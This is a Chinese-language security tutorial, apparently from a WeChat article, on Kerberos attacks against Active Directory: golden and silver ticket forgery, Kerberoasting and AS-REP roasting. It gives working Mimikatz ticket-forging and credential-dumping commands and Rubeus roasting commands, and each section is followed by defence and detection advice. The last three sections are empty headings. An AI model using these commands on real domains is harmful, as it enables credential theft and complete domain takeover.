> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2e82kv42tSFzhdZI2zOgDA)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC58quia39negezdlC9jIicJxtLAe1cu29dKk6PS4Ro8CR4ib7HOCTXq1TgA/640?wx_fmt=png)

**1.0 黄金票据的原理和条件**
==================

`黄金票据`是`伪造票据授予票据（TGT）`。

> 票据授予票据（TGT），也被称为认证票据

`黄金票据`特点:

```
1.与域控制器没有AS-REQ或AS-REP通信
2.需要krbtgt用户的hash（KDC Hash）
3.由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到域控制器以获得服务票据
```

我们可以看一个图理解一下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5lzicvdoXeSBa1DYBnZOlf7qvfZkBaz3gHudGlhuA4eI3kqqf2uJSiaHQ/640?wx_fmt=png)

`Kerberos黄金票据`是`有效`的`TGT Kerberos票据`，因为它是由`域Kerberos帐户（KRBTGT）加密`和`签名`的。`TGT`仅用于向`域控制器`上的`KDC服务`证明`用户`已被其他`域控制器认证`。`TGT`被`KRBTGT密码散列加密`并且可以被`域`中的任何`KDC服务解密`的。

`黄金票据`的条件要求：

```
1.域名称
2.域的SID值
3.域的KRBTGT账户NTLM密码哈希
4.伪造用户名
```

**1.1 实战手法**
------------

我们这里在一台域服务器中抓取到了 KRBTGT 账户的账号密码（hash）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5GvELaG6vIicAPFSB5DN3UZZicT676gz7M4gVPwftx6syzYqiadypOt5FA/640?wx_fmt=png)

那么这里我们可以直接使用 cobalt strike 来利用黄金票据

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5rrMeLElVsXnlKMEs48ibf9Bt3aKYbxC3D8lDwmXFibVxNT2LeojvfvLQ/640?wx_fmt=png)

填入必须值

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5DYWR9kiaBJ6iaUiaWr4tPM7tqAZHg6P0MY1PzffHkWpcqjDOJpXb2wl0g/640?wx_fmt=png)

就可以了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5bkyxzl6wqNybzUKp6tDwsKibea71iahtGPEoeF71tReTBhE0LicB84IwQ/640?wx_fmt=png)

在`TGT`的使用期限超过`20`分钟之前，`域控制器KDC服务`不会`验证TGT`中的`用户帐户`，这意味着我们`可以使用`已`禁用`/`删除`的`帐户`，甚至可以使用`Active Directory`中`不存在`的`虚构帐户`。

由于在`域控制器`上由`KDC服务`生成`票证`时会在`票证`上设置`域Kerberos策略`，因此当提供`票证`时，`系统`会`信任票证`的`有效性`。这意味着即使`域策略`声明`Kerberos登录票证（TGT）`仅有效期为`10`个小时，如果`票证`声明其有效期为`10`年，则是`10`年。

该`KRBTGT帐户密码`从`不更改`* 和直到`KRBTGT密码被更改（两次）`，我们可以`创建黄金票`据。注意，即使`模拟`的`用户`更改了`密码`，为`模拟用户而创建的黄金票据也会保`留。

`黄金票据`可以绕过了`SmartCard身份验证`要求，因为它`绕过了DC`在创建`TGT`之前执行的`常规检查`。

`黄金票证（TGT）`可以在任何`计算机`上生成和使用，即使其中一台未加入`域`也是可以的。

当然我们也可以使用`Mimikatz`伪造`Kerberos`票证：

**1.2 Mimikatz 命令示例：**
----------------------

```
kerberos :: golden / admin：ADMIINACCOUNTNAME / domain：DOMAINFQDN / id：ACCOUNTRID / sid：DOMAINSID / krbtgt：KRBTGTPASSWORDHASH / ptt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5mG3sLC7Mn9aU4w722cIzLa8C2oCRyHLrCRSTdBeDibddwxSVooRrs6g/640?wx_fmt=png)

Mimikatz 创建黄金的命令是`“kerberos :: golden”`

```
mimikatz “kerberos::golden /domain:<域名> /sid:<域SID> /rc4:<KRBTGT NTLM Hash> /user:<任意用户名> /ptt" exit
```

```
/domain -----完整的域名，在这个例子中：“lab.adsecurity.org”

/ sid ----域的SID,在这个例子中：“S-1-5-21-1473643419-774954089-2222329127”

/ sids --- AD森林中账户/组的额外SID，凭证拥有权限进行欺骗。通常这将是根域Enterprise Admins组的“S-1-5-21-1473643419-774954089-5872329127-519”值。Ť 

 / user ---伪造的用户名

/ groups（可选）---用户所属的组RID（第一组是主组）。添加用户或计算机帐户RID以接收相同的访问权限。默认组：513,512,520,518,519为默认的管理员组。

/ krbtgt---域KDC服务帐户（KRBTGT）的NTLM密码哈希值。用于加密和签署TGT。

/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用或使用/ ptt立即将黄金票据插入内存以供使用。

/ ptt - 作为/ ticket的替代品 - 使用它来立即将伪造的票据插入到内存中以供使用。

/ id（可选） - 用户RID。Mimikatz默认值是500（默认管理员帐户RID）。

/ startoffset（可选） - 票据可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值是0。

/ endin（可选） - 票据使用时间范围。Mimikatz默认值是10年（〜5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。

/ renewmax（可选） - 续订最长票据有效期。Mimikatz默认值是10年（〜5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。

/ sids（可选） - 设置为AD林中企业管理员组（ADRootDomainSID）-519）的SID，以欺骗整个AD林（AD林中每个域中的AD管理员）的企业管理权限。

/ aes128 - AES128密钥

/ aes256 - AES256密钥

黄金票默认组：

域用户SID：S-1-5-21 <DOMAINID> -513

域管理员SID：S-1-5-21 <DOMAINID> -512

架构管理员SID：S-1-5-21 <DOMAINID> -518

企业管理员SID：S-1-5-21 <DOMAINID> -519（只有在森林根域中创建伪造票证时才有效，但为AD森林管理员权限添加使用/ sids参数）

组策略创建者所有者SID：S-1-5-21 <DOMAINID> -520

命令格式如下：

kerberos :: golden / user：ADMIINACCOUNTNAME / domain：DOMAINFQDN / id：ACCOUNTRID / sid：DOMAINSID / krbtgt：KRBTGTPASSWORDHASH / ptt

命令示例：
.\mimikatz “kerberos::golden  /user:DarthVader  /domain:rd.lab.adsecurity.org  /id:500 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321  /ptt” exit
```

**2.0 白银票据的原理和条件**
==================

`银票`是`伪造`的`票证授予服务票`，也称为`服务票`。

如下图所示，与`域控制器`之间没有`AS-REQ` / `AS-RE`P（步骤 1 和 2），也没有`TGS-REQ` / `TGS-REP`（步骤 3 和 4）`通信`。由于`白银票据`是伪造的`TGS`，因此无法与`域控制器`通信。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5updBLL11T9usdYBOeehSzBz2eOkWUFjsJ1VPlkgqIa6htiamkb9NJkw/640?wx_fmt=png)

该`Kerberos的银票`是`有效`的`票证授予服务（TGS）Kerberos票据`，它是`加密`/`通过`与`配置`的`服务帐户`登录`服务主体`名称为每个`服务器`与`Kerberos身份验证`的`服务`运行。

`黄金票证`是`伪造`的`TGT`，可有效`访问`任何`Kerberos服务`，而`银票`证是`伪造`的`TGS`。这意味着`银票`范围仅限于`特定服务器`上针对的`任何服务`。

使用`域Kerberos服务帐户（KRBTGT）`对`黄金票证`进行`加密`/`签名`时，通过`服务帐户`（从计算机的`本地SAM`或`服务帐户凭据`中提取的`计算机帐户凭据`）对`银票`进行`加密`/`签名`。

大多数`服务`不会验证`PAC`（通过将`PAC校验`和`发送`到`域控制器`以进行`PAC验证`），因此使用`服务帐户密码哈希`生成的`有效TGS`可以包含`完全虚构`的`PAC`- 甚至声称`用户`是`域管理员`。

`TGS`是`伪造`的，因此没有关联的`TGT`，这意味着不用链接`DC`，任何`事件日志`都位于`目标服务器`上。`尽管范围比金牌更有限，但所需的哈希值更容易获得，并且在使用时与DC没有通信，因此检测比`黄金票证`更困难`。

**2.1 条件**
----------

当拥有`Server Hash`时，我们就可以伪造一个不经过`KDC`认证的一个`Ticket`。

```
/target –目标服务器的FQDN

FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”）

/service –运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等

/rc4 –服务的NTLM散列（计算机帐户或用户帐户）
> PS:Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。
> 所以，一切凭据都来源于Server Hash。
```

**2.2 伪造白银票据 (Silver Tickets)**
-------------------------------

**首先需要导出 Server Hash：**

管理员权限运行 mimikatz

```
mimikatz "privilege::debug” "sekurlsa::logonpasswords" "exit"  > "C:\Users\Administrator.WEB\Desktop\1.txt"
```

privilege::debug #提升权限  
sekurlsa::logonpasswords #获取 service 账户 hash 和 sid(同一个域下得 sid 一样)

我这里在 cobalt strike 中演示

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5vdgia43qjicMUXac0ibSrsLP9yAPX8MjTQ9o348icMVq3sibyank1az7g7w/640?wx_fmt=png)

**空本地票据缓存**

kerberos::purge #清理本地票据缓存  
kerberos::list #查看本地保存的票据

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5d4Ruhrg6QzOT3NWSX7dl1oqDLRKLlKMs1R7w0BkpGkqYhPQjwel6Uw/640?wx_fmt=png)

**伪造白银票据并导入**

```
mimikatz “kerberos::golden /domain:<域名> /sid:<域 SID> /target:<目标服务器主机名> /service:<服务类型> /rc4:<NTLM Hash> /user:<用户名> /ptt" exit
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5VibV39njPS0Ml7FhXicloUh54h1eSNhZB8DV1UGOiaVdD1HeR0nvekxtQ/640?wx_fmt=png)

**Mimikatz 命令示例：**
------------------

```
/domain –完整的域名称，如：lab.adsecurity.org

/sid –域的SID，如：S-1-5-21-1473643419-774954089-2222329127

/user – 域用户名

/ groups（可选） - 用户所属的组RID

/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用，或者使用/ ptt立即将黄金票据插入到内存中以供使用

 /ptt - 作为/ ticket的替代品，使用它来立即将伪造的票据插入到内存中以供使用。

/ id（可选） - 用户RID，Mimikatz默认值是500（默认管理员帐户RID）

/ startoffset（可选） - 票证可用时的起始偏移（如果使用此选项，通常设置为-10或0）Mimikatz默认值是0

/ endin（可选） - 票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为10小时

/ renewmax（可选） - 续订最长票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为最长为7天
```

 **白银票据默认组**

```
域用户SID：S-1-5-21 <DOMAINID> -513
域管理员SID：S-1-5-21 <DOMAINID> -512
架构管理员SID：S-1-5-21 <DOMAINID> -518
企业管理员SID：S-1-5-21 <DOMAINID> -519
组策略创建所有者SID：S-1-5-21 <DOMAINID> -520
```

**白银票据在各种服务中的实列**
-----------------

```
Service Type                                  Service Silver Tickets
 WMI                                           HOST RPCSS
 PowerShell Remoting                           HOST  HTTP
 WinRM                                         HOST  HTTP
 Scheduled Tasks                               HOST
 Windows File Share (CIFS)                     CIFS

 LDAP operations including
 Mimikatz DCSync                               LDAP

 Windows Remote Server Administration Tools    RPCSS LDAP CIFS
```

**伪造 Windows 共享（CIFS）管理访问的银票**

通过为`cifs`服务创建`白银票据`，以获得`目标计算机`上`任何Windows共享的管理权限`

**3.0 黄金票据和白银票据区别**
===================

1.TGS ticket 针对的是某个机器上的某个服务，TGT 针对的是所有机器的所有服务  
2.TGT 利用 krbtgt 账户的 hash，TGS ticket 利用的是服务账户的 hash（目标机的 hash, 以计算机名 $ 显示的账户）

**黄金票据的实验结果：**  
能够在域里边所有机器上都以 administrator 登录

**白银票据的实验结果：**  
以前就能够 psexec 的，使用白银票据添加 cifs 为 administrator 权限后，能够在 psexec 之后以 administrator 登录

以前就不能后动 psexesvc 的机器，实用白银票据添加 cifs 后，dir 由无权查看变为有权查看

**hash 位置**  
运行中的系统，需要从内存抓取 ->lassas.exe 进程里边存放的是活动用户的 hash（当前登录的用户）普通域用户或普通工作组：SAM 文件（加密后的用户密码）/SYSTEM 文件（秘钥）windows/system32/config/SAM 存的是当前机器所用户的 Hash

域控：ntds.dit 所有域用户的账号 / 密码（hash）

**4.0 检测伪造的 Kerberos 票证**
=========================

**4.1 白银票据 (Silver Tickets) 防御**  
1. 尽量保证服务器凭证不被窃取

2. 开启 PAC (Privileged Attribute Certificate) 特权属性证书保护 功能，PAC 主要是规定服务器将票据发送给 kerberos 服务，由 kerberos 服务验证票据是否有效。

开启方式:

将注册表中

```
HKEY_LOCAL_MACHINE\SYSTEM \ CurrentControlSet\Control\Lsa\Kerberos\Parameters

中的ValidateKdcPacSignature设置为1。
```

3. 侦测

  
监视异常的 Kerberos 活动，例如 Windows 登录 / 注销事件中的格式错误或空白字段（事件 ID 4624、4634、4672）。[2]

监视与 lsass.exe 交互的意外进程。[6] 诸如 Mimikatz 之类的通用凭证转储者通过打开进程，找到 LSA 秘密密钥并解密内存中存储凭证详细信息（包括 Kerberos 票证）的部分，来访问 LSA 子系统服务（LSASS）进程。  

**4.2 黄金票据 (Silver Tickets) 防御**

1. 限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机。这降低攻击者通过横向扩展，获取域管理员的账户，获得访问域控制器的 Active Directory 的 ntds.dit 的权限。如果攻击者无法访问 AD 数据库（ntds.dit 文件），则无法获取到 KRBTGT 帐户密码。

2. 建议定期更改 KRBTGT 密码。更改一次，然后让 AD 备份，并在 12 到 24 小时后再次更改它。这个过程应该对系统环境没有影响。这个过程应该是确保 KRBTGT 密码每年至少更改一次的标准方法。

3. 一旦攻击者获得了 KRBTGT 帐号密码哈希的访问权限，就可以随意创建黄金票据。通过快速更改 KRBTGT 密码两次，使任何现有的黄金票据（以及所有活动的 Kerberos 票据）失效。这将使所有 Kerberos 票据无效，并消除攻击者使用其 KRBTGT 创建有效金票的能力。

4. 侦测  
监视异常的 Kerberos 活动，例如 Windows 登录 / 注销事件（事件 ID 4624、4672、4634）中的格式错误或空白字段，TGT 中的 RC4 加密以及 TGS 请求，而无需前面的 TGT 请求。

监视 TGT 票证的生存期，以获取与默认域持续时间不同的值。

**5.0 Kerberoasting 攻击**
========================

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5PwiavaLq3QKlbNyDkgfdboNT70nPRITuVvIMDRQu0ggC50Hvtfxb1QQ/640?wx_fmt=png)

`Kerberos协议`在请求访问`某个服务`时存在一个`缺陷`，`Kerberoasting`正是利用这个`缺陷`的一种`攻击技术`。

我们可以破解服务帐户密码，而无需拿到管理员的账号密码哈希。我们通过在主机中使用服务帐户请求 TGS 票证多项服务。从内存中导出 TGS 票证，然后破解就可以。也可以通过嗅探网络流量并脱机获取使用 RC4_HMAC_MD5 加密的 Kerberos TGS 票证来攻击。

**5.1 攻击流程**
------------

1、用户将`AS-REQ数据包`发送给`KDC`（`Key Distribution Centre，密钥分发中心，此处为域控`），进行身份`认证`。

2、`KDC`验证`用户`的`凭据`，如果`凭据`有效，则返回`TGT（Ticket-Granting Ticket，票据授予票据`）。

3、如果用户想通过`身份认证`，访问`某个服务`（如`IIS`），那么他需要发起（`Ticket Granting Service，票据授予服务`）`请求`，`请求`中包含`TGT`以及所`请求服务`的`SPN`（`Service Principal Name`，`服务主体名称`）。

4、如果`TGT`有效并且没有过期，`TGS`会创建用于`目标服务`的一个`服务票据`。`服务票据`使用`服务账户`的`凭据`进行`加密`。

5、`用户`收到包含`加密服务票据`的`TGS响应数据包`。

6、最后，`服务票据`会转发给`目标服务`，然后使用`服务账户`的`凭据`进行`解密`。

整个过程比较简单，我们需要注意的是，`服务票据`会使用`服务账户`的`哈希`进行`加密`，这样一来，`Windows域`中任何经过`身份验证`的`用户`都可以从`TGS`处请求`服务票据`，然后`离线暴力破解`。

**5.2 实战手法**
------------

1.SPN 扫描具有服务帐户的 SQL Server

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC59ZRau6RnndTa29RRic5J14yh0NJ4wlnvthgmWJWwdWcY9YMgah2o9vw/640?wx_fmt=png)

2. 确定目标之后，我们使用 PowerShell 请求此服务主体名称（SPN）的服务票证。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5OSrQRJm7NVY0VEo19iaNbJsia2ewRlLOBCXY1setfuy90Fcib1ZXjf6SA/640?wx_fmt=png)

查看数据包捕获，我们可以看到 Kerberos 通信，并注意到票证是 RC4-HMAC-MD5。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5wVGF7OZUye9rsOmHibph92OBxecIsrKY7sKB3qYKFaH3xf1GjxuFRow/640?wx_fmt=png)

3. 客户端收到票证后，我们可以使用 Mimikatz（或其他）导出用户存储空间中的所有 Kerberos 票证。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC51CvwojCUWY4F2U1PJQ1ey96wiapqKDTwiaLJaIlufM7q3090e1ibECkWw/640?wx_fmt=png)

4. 将服务票证导出到文件后，可以将该文件发送到运行带有 Kerberoast 的 Kali Linux 的攻击者计算机。破解与票证（文件）相关的服务帐户的密码。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5DVZYVON3I7ZvwYZ5wjWUiauFr88LmYGWz2wbgDX8E1EBXdlLbLXlVrQ/640?wx_fmt=png)

**tips:**

由于服务帐户通常在许多企业中被过度使用，并且密码通常很弱，因此这是我们从域用户转到域管理员的简便方法。

**5.3 防御手法**
------------

确保所有服务帐户（具有服务主体名称的用户帐户）使用的长而复杂的密码必须大于 25 个字符，最好为 30 个或更多。这使得破解这些密码更加困难。具有较高 AD 权限的服务帐户应重点确保其具有长而复杂的密码。确保定期更改所有服务帐户密码（每年至少更改一次）。如果可能，请使用组管理的服务帐户，这些帐户具有随机的复杂密码（> 100 个字符），并由 Active Directory 自动管理。

**5.4 检测**
----------

由于要在用户需要访问资源时始终请求服务票证（Kerberos TGS 票证），因此检测要困难得多。  
寻找带有 RC4 加密的 TGS-REQ 数据包可能是最好的方法，尽管可能会出现误报。  
通过启用 Kerberos 服务票证请求监视（“审核 Kerberos 服务票证操作”）并搜索具有过多 4769 事件（Eventid 4769 “已请求 Kerberos 服务票证”）的用户，可以监视 Active Directory 中的多个 Kerberos 服务票证请求。

**6.0 AS-REP Roasting**
=======================

AS-REP Roasting 是针对不需要预身份验证的用户帐户的 Kerberos 攻击。

预身份验证是 Kerberos 身份验证的第一步，旨在防止暴力破解密码猜测攻击。

在预身份验证期间，用户将输入其密码，该密码将用于加密时间戳，然后域控制器将尝试对其进行解密，并验证是否使用了正确的密码，并且该密码不会重播先前的请求。发出 TGT，供用户将来使用。

如果禁用了预身份验证（DONT_REQ_PREAUTH），则我们可以为任何用户请求身份验证数据，那么 DC 将返回的加密 TGT，我们就可以离线暴力破解的加密 TGT。

默认情况下，Active Directory 中需要预身份验证。但是，可以通过每个用户帐户上的用户帐户控制设置来控制此设置。

> Under normal operations in a Windows Kerberos environment, when you  
> initiate a TGT request for a given user (Kerberos AS-REQ, message type  
> 10) you have to supply a timestamp encrypted with that user’s  
> key/password. This structure is PA-ENC-TIMESTAMP and is embedded in  
> PA-DATA (preauthorization data) of the AS-REQ – both of these  
> structure are described in detail on page 60 of RFC4120 and were  
> introduced in Kerberos Version 5. The KDC then decrypts the timestamp  
> to verify if the subject making the AS-REQ really is that user, and  
> then returns the AS-REP and continues with normal authentication  
> procedures.
> 
> Note: the KDC does increase the badpwdcount attribute for any  
> incorrect PA-ENC-TIMESTAMP attempts, so we can’t use this as a method  
> to online brute-force account passwords :(
> 
> The reason for Kerberos preauthentication is to prevent offline  
> password guessing. While the AS-REP ticket itself is encrypted with  
> the service key (in this case the krbtgt hash) the AS-REP “encrypted  
> part” is signed with the client key, i.e. the key of the user we send  
> an AS-REQ for. If preauthentication isn’t enabled, an attacker can  
> send an AS-REQ for any user that doesn’t have preauth required and  
> receive a bit of encrypted material back that can be cracked offline  
> to reveal the target user’s password.

在现代 Windows 环境中，所有用户帐户都需要 Kerberos 预身份验证，但默认情况下，Windows 会在不进行预身份验证的情况下尝试进行 AS-REQ / AS-REP 交换，而后一次在第二次提交时提供加密的时间戳：

**6.1 实战手法**
------------

**1. 用 Rubeus 进行 AS-REP**

Rubeus 是用于原始 Kerberos 交互和滥用的 C＃工具集。

```
Rubeus.exe asreproast
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5BmDPIvLepjdyRHZT6QClwiaOqERiaLibIyea4UCh6rY6zfTI4aMOpJYvw/640?wx_fmt=png)

这将自动查找所有不需要预身份验证的帐户，并提取脱机破解所需的加密 TGT 数据

我们也可以使用以下命令以 Hashcat 可以离线破解的格式提取数据对这种哈希执行快速的暴力破解密码。

```
Rubeus.exe asreproast /format:hashcat /outfile:C:Temphashes.txt
```

它将 AS-REP 哈希信息输出到文本文件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC52l82ialofqLF2icXgl9TCOvxiah4KP9UlGJ40YGuJkoQPlhe0fYcMOB0g/640?wx_fmt=png)

对特定用户进行攻击

```
Rubeus.exe asreproast /user:TestOU3user
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5DXibhcZibBZm7mvk0iaCBC5Md4wPhJLAM03z7MJRKXDibk5r8VARrwSibYibOJhckia8vMA9vUGE197bg/640?wx_fmt=png)

**6.2 防御手法**
------------

识别不需要预身份验证的帐户  
免受此类攻击的明显保护是找到并删除设置为不需要 Kerberos 预身份验证的用户帐户的所有实例。

**7.0 MS14-068 伪造的 PAC 利用**
===========================

**8.0 钻石 PAC 使用金票和 MS14-068 伪造 PAC 的混合攻击**
==========================================

**9.0 Skeleton Key 攻击**
=======================